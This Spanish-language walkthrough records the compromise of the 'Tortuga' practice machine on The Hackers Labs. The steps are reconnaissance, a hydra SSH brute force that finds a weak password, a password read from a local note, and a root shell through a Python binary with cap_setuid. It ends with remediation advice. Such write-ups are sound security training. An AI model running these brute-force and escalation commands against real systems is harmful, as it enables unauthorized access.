---
icon: turtle
---

# Tortuga

## Tortuga&#x20;

**Entorno y contexto:**

**The Hackers Labs** ([https://labs.thehackerslabs.com](https://labs.thehackerslabs.com/machine/131))

Máquina objetivo: **192.168.77.67**.&#x20;

Este documento recoge con detalle técnico, todo el proceso: descubrimiento, explotación, escalada y evidencias.

***

### Resumen ejecutivo

* **Objetivo:** Obtener `user.txt` y `root.txt`.
* **Resultados:** Acceso inicial por SSH como `grumete` (credencial obtenida por fuerza bruta) y escalada a `root` aprovechando `cap_setuid=ep` en `/usr/bin/python3.11`.
* **Herramientas:** `nmap`, `gobuster`, `ffuf` (opcional), `hydra`, `ssh`, `getcap`, `python3.11`, `nc`, `curl`.
* **Entorno de práctica:** VirtualBox + The Hackers Labs.
* **Evidencias incluidas:** salidas de `nmap`, `gobuster`, contenidos de `/mapa.php` y `/tripulacion.php`, transcript SSH, scripts de explotación y flags (`user.txt`, `root.txt`).

> Nota: este documento contiene artefactos reales del laboratorio. Si lo vas a publicar, revisa los apartados de `Evidencias` y considera redactar flags/credenciales si corresponde.

***

### 1) Reconocimiento — superficie de ataque

Comando principal que ejecuté para reconocimiento inicial:

```bash
┌──(root㉿deox-kali)-[~]
└─# nmap -sC -sV 192.168.77.67
```

Salida relevante (extracto):

```bash
Nmap scan report for 192.168.77.67
Host is up (0.00011s latency).
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
MAC Address: 08:00:27:07:CD:5C (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Análisis:** la máquina expone SSH y HTTP. El servicio HTTP presentaba contenido estático/ dinámico con posibles pistas; esto sugiere que debemos realizar enumeración web dirigida antes de ataques indiscriminados.

***

### 2) Enumeración web — discovery y correlación de pistas

Ejecuté un barrido de directorios con `gobuster` para identificar endpoints y archivos potencialmente sensibles:

```bash
┌──(root㉿deox-kali)-[~]
└─# gobuster dir -u http://192.168.77.67 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -t 50 -o scans/gobuster-tortuga.txt
```

Salida relevante (extracto):

```bash
/index.html           (Status: 200) [Size: 1440]
/mapa.php             (Status: 200) [Size: 922]
/server-status        (Status: 403) [Size: 278]
Additional page discovered: /tripulacion.php (manual discovery)
```

#### Contenido de `/mapa.php`

```html
<!DOCTYPE html>
<html lang="es">
<head><meta charset="UTF-8"><title>Mapa</title></head>
<body>
    <h1>Mapa de Isla Tortuga</h1>
    <pre>
~~~~~~~~~~~~~~~~~~~
~     PIRATE BAY   ~
~~~~~~~~~~~~~~~~~~~
       |   |
       |   |    X  (tesoro enterrado)
       |   |
~~~~~~~~~~~~~~~~~~~
~     PUERTO       ~
~~~~~~~~~~~~~~~~~~~
    </pre>
    <p><i>Una nota arrugada se lee en la esquina del mapa...</i></p>
    <p>"Ey <b>grumete</b> revisa la nota oculta que dejado en tu camarote..."</p>
</body>
</html>
```

**Observación técnica:** el archivo incluye una referencia explícita al término `grumete`, que puede ser un nombre de usuario. En ejercicios de pentesting ofensivo, este tipo de información en contenido público reduce la entropía del objetivo y facilita ataques dirigidos de credenciales.

#### Contenido de `/tripulacion.php`

```html
<!DOCTYPE html>
<html lang="es">
<head><meta charset="UTF-8"><title>Tripulación</title></head>
<body>
    <h1>La Tripulación de Tortuga</h1>
    <ul>
        <li><b>Capitán Barbanegra</b> – Estratega implacable.</li>
        <li><b>Corsario Rojo</b> – Maestro de la espada.</li>
        <li><b>Grumete Verde</b> – Aprendiz despistado.</li>
        <li><b>Timón de Hierro</b> – El que nunca pierde el rumbo.</li>
    </ul>
    <p><i>"Quien domine el timón hallará el rumbo a la victoria..."</i></p>
    <p><i>"Recuerda: el viejo truco de las rutas dobles siempre funciona..."</i></p>
</body>
</html>
```

**Análisis:** la página confirma términos relacionados a usuarios (Grumete/Timón) y aporta la sugerencia "rutas dobles" que puede interpretarse como una pista para probar rutas con dobles barras `//` o versiones de directorios con sufijos/extensions. Toda pista textual debe registrarse y correlacionarse con diferentes vectores (nombres de usuario, rutas, parámetros).

***

### 3) Ataque dirigido a autenticación — fuerza bruta

Con la hipótesis de que exista un usuario `grumete`, lancé un ataque de diccionario controlado contra SSH, registrando la salida para auditoría:

```bash
┌──(root㉿deox-kali)-[~]
└─# hydra -l grumete -P /usr/share/wordlists/rockyou.txt ssh://192.168.77.67 -t 4 -o scans/hydra-ssh-tortuga.txt
```

Resultado (extracto):

```bash
Hydra output (abridged)
Target: ssh://192.168.77.67:22
[22][ssh] host: 192.168.77.67   login: grumete   password: 1234
1 valid password found
```

**Riesgo y ética:** este tipo de pruebas deben realizarse en entornos autorizados. En producción, la presencia de credenciales débiles y la exposición de nombres de usuario en áreas públicas incrementan significativamente el riesgo.

***

### 4) Acceso inicial y enumeración local

Tras obtener la credencial, establecí sesión SSH con `grumete` y procedí a la enumeración mínima necesaria para identificar vectores de escalada:

```bash
┌──(root㉿deox-kali)-[~]
└─# ssh grumete@192.168.77.67
# (usar la credencial detectada [1234])
grumete@TheHackersLabs-Tortuga:~$ cat 
.bash_history   .bashrc        .nota.txt      .profile       user.txt       
grumete@TheHackersLabs-Tortuga:~$ cat .nota.txt
grumete@TheHackersLabs-Tortuga:~$ cat user.txt
############################
```

Extracto de `.nota.txt`:

<pre class="language-bash"><code class="lang-bash"><strong>grumete@TheHackersLabs-Tortuga:~$ cat .nota.txt
</strong>Querido grumete,

Parto rumbo a la isla vecina por asuntos que no pueden esperar, estaré fuera un par de días. 
Mientras tanto, confío en ti para que cuides del barco y de la tripulación como si fueran míos. 

La puerta de la cámara del timón está asegurada con la contraseña: 
    "mar_de_fuego123"  

Recuerda, no se la reveles a nadie más. Has demostrado ser leal y firme durante todos estos años 
navegando juntos, y eres en quien más confío en estos mares traicioneros.

Mantén la guardia alta, vigila las provisiones y cuida de que ningún intruso ponga un pie en cubierta.  
Cuando regrese, espero encontrar el barco tal y como lo dejo hoy (¡y nada de usar la bodega de ron 
para hacer carreras de tortugas otra vez!).  

Con la confianza de siempre,  
— El Capitán
</code></pre>

**Observación:** la nota contiene una contraseña (`mar_de_fuego123`) para un recurso local denominado "cámara del timón" — esto confirma el patrón de pistas entre el contenido web y recursos locales. Guardé `user.txt` como evidencia para el informe.

***

### 5) Búsqueda de vectores de escalada — capacidades y SUIDs

Accedemos al perfil del capitan:

```bash
┌──(root㉿deox-kali)-[~]
└─# ssh capitan@192.168.77.67
# (usar la credencial detectada [mar_de_fuego123])
capitan@TheHackersLabs-Tortuga:~$ ls -la
total 24
drwxr-xr-x 2 capitan capitan 4096 sep  5 14:30 .
drwxr-xr-x 4 root    root    4096 sep  5 11:49 ..
lrwxrwxrwx 1 root    root       9 sep  5 11:59 .bash_history -> /dev/null
-rw-r--r-- 1 capitan capitan  220 abr 23  2023 .bash_logout
-rw-r--r-- 1 capitan capitan 3597 sep  5 14:23 .bashrc
-rw-r--r-- 1 capitan capitan  807 abr 23  2023 .profile
-rw------- 1 root    capitan   18 sep  5 14:30 .python_history
```

En el perfil del capitan no habia nada excepto un `.python_history` lo cual mas adelante usaremos para escalar a `root`.

Busqué binarios con capabilities y SUID/SGID para identificar vectores explotables:

<pre class="language-bash"><code class="lang-bash"><strong>capitan@TheHackersLabs-Tortuga:~$ getcap -r / 2>/dev/null
</strong># y búsqueda de SUIDs si procede (find / -perm -4000 ...)
</code></pre>

Salida relevante observada:

```
/usr/bin/ping cap_net_raw=ep
/usr/bin/python3.11 cap_setuid=ep
```

**Interpretación técnica:** la presencia de `cap_setuid=ep` en `/usr/bin/python3.11` indica que dicho binario puede modificar UID efectivos si es invocado por un proceso con la capacidad asociada. Esto es un vector de elevación de privilegios crítico cuando se asigna a un intérprete general como Python.

***

### 6) Explotación del vector — escalada a root

Con control local, usé Python para invocar `os.setuid(0)` y lanzar una shell con UID 0:

<pre class="language-bash"><code class="lang-bash"><strong>capitan@TheHackersLabs-Tortuga:~$ /usr/bin/python3.11 -c 'import os; os.setuid(0); os.system("/bin/bash")'
</strong></code></pre>

Comprobación inmediata:

<pre class="language-bash"><code class="lang-bash">root@TheHackersLabs-Tortuga:~# whoami
root
<strong>root@TheHackersLabs-Tortuga:~# cd /root 
</strong>root@TheHackersLabs-Tortuga:/root# cat root.txt
############################
</code></pre>

**Riesgo crítico:** otorgar capacidades que permiten cambios de UID a intérpretes capaces de ejecutar código arbitrario (Python, Perl, etc.) es una mala práctica severa. En entornos productivos puede equivaler a una ruta de RCE → root en segundos.

***

### 7) Análisis técnico extendido

#### 7.1 Vectores y ataque de superficie

* **Exposición de información sensible en contenido web:** El inclusion de nombres de usuarios o pistas en HTML reduce la seguridad por 'information leakage'. Un adversario puede prioritizar usuarios para ataques de fuerza bruta y phishing.
* **Credenciales débiles:** contraseñas como `1234` en un laboratorio ejemplifican un fallo de seguridad común; en producción, requiere políticas de contraseñas y autenticación fuerte.
* **Capabilities mal aplicadas:** conceder `cap_setuid` a un intérprete ofrece una ruta de escalada de privilegios inmediata. Las policies de capabilities deben ser restrictivas y auditadas con frecuencia.

#### 7.2 Remediación técnica recomendada (priorizada)

1. **Eliminar capabilities innecesarias** de intérpretes y binarios de propósito general:

```bash
# Auditar primero, luego:
sudo setcap -r /usr/bin/python3.11
```

2. **Forzar autenticación por clave pública** en SSH y deshabilitar autenticación por contraseña:

```bash
# /etc/ssh/sshd_config
PasswordAuthentication no
ChallengeResponseAuthentication no
PermitRootLogin no
```

3. **Retirar pistas públicas** y cualquier dato identificador de usuarios en contenido web. Usar mecanismos de acceso autenticado para áreas que contengan información operativa.
4. **Monitoreo y detección**: desplegar reglas en EDR/Host IDS que alerten sobre uso de binarios con capabilities (invocaciones a /usr/bin/python3.11 con setuid, llamadas a setuid, etc.).
5. **Políticas de hardening y revisión periódica** (SUIDs, capabilities, sudoers, paquetes desactualizados).

***

### 8) Reproducibilidad — comandos clave

```bash
# Recon
nmap -sC -sV 192.168.77.67

# Enumeración web
gobuster dir -u http://192.168.77.67 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -t 50

# Fuerza bruta dirigida (solo en laboratorio autorizado)
hydra -l grumete -P /usr/share/wordlists/rockyou.txt ssh://192.168.77.67 -t 4 -o scans/hydra-ssh.txt

# Acceso por SSH (ejemplo)
ssh grumete@192.168.77.67

# Enumeración local
getcap -r / 2>/dev/null
# (opcional) find / -perm -4000 -type f 2>/dev/null

# Escalada (si python tiene cap_setuid=ep)
/usr/bin/python3.11 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

***

_Documento generado y compilado por deox420 durante la práctica en The Hackers Labs._
